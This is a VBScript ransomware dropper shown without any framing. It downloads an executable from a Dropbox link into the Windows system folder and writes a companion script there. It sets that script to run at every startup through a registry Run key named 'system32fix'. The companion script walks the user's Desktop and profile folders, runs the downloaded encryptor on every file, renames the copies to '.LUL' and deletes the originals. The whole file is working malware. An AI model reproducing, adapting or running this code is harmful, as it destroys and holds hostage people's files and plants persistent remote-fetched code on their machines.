code= "Set wshShell=CreateObject(""WScript.Shell"")" & vbcrlf &_
"Set fso=CreateObject(""Scripting.FileSystemObject"")" & vbcrlf &_
"dirsystem =fso.GetSpecialFolder(1)" & vbcrlf &_
"encryptfile(wshShell.SpecialFolders(""Desktop""))" & vbcrlf &_
"folderlist(wshShell.ExpandEnvironmentStrings(""%USERPROFILE%""))" & vbcrlf &_
"Sub folderlist(folderspec)" & vbcrlf &_
"On Error Resume Next" & vbcrlf &_
"Set f = fso.GetFolder(folderspec)" & vbcrlf &_
"Set sf = f.SubFolders" & vbcrlf &_
"For Each f1 in sf" & vbcrlf &_
"encryptfile(f1.path)" & vbcrlf &_
"folderlist(f1.path)" & vbcrlf &_
"Next" & vbcrlf &_
"End Sub" & vbcrlf &_
"Sub encryptfile(folderspec)" & vbcrlf &_
"On Error Resume Next" & vbcrlf &_
"Set f = fso.GetFolder(folderspec)" & vbcrlf &_
"Set fc = f.Files" & vbcrlf &_
"For Each f1 In fc" & vbcrlf &_
"ext = fso.GetExtensionName(f1.path)" & vbcrlf &_
"If ext<>""LUL"" And ext<>""lnk"" Then" & vbcrlf &_
"wshShell.Run dirsystem & ""\system32encrypt.exe "" & f1.path, 1, true" & vbcrlf &_
"Set cop =fso.GetFile(f1.path)" & vbcrlf &_
"bname = fso.GetBaseName(f1.path)" & vbcrlf &_
"cop.copy(folderspec & ""\"" & bname & "".LUL"")" & vbcrlf &_
"fso.DeleteFile(f1.path)" & vbcrlf &_
"End If" & vbcrlf &_
"Next" & vbcrlf &_
"End Sub"

Set fso=CreateObject("Scripting.FileSystemObject")
Set wshShell=CreateObject("WScript.Shell")
dirsystem=fso.GetSpecialFolder(1)
Set startup=fso.CreateTextFile(dirsystem & "\system32encrypter.vbs")

startup.write code
startup.close()
wshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\system32fix", _
dirsystem & "\system32encrypter.vbs"

url = "https://www.dropbox.com/s/hyfuw00eytw51zc/system32encrypt.exe?dl=1"
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
Set adodb = CreateObject("ADODB.Stream")
objWinHttp.open "GET", url, False
objWinHttp.send ""
adodb.Type = 1
adodb.Open
adodb.Write objWinHttp.responseBody
adodb.SaveToFile dirsystem & "\system32encrypt.exe", 2

wshShell.Run dirsystem & "/system32encrypter.vbs"


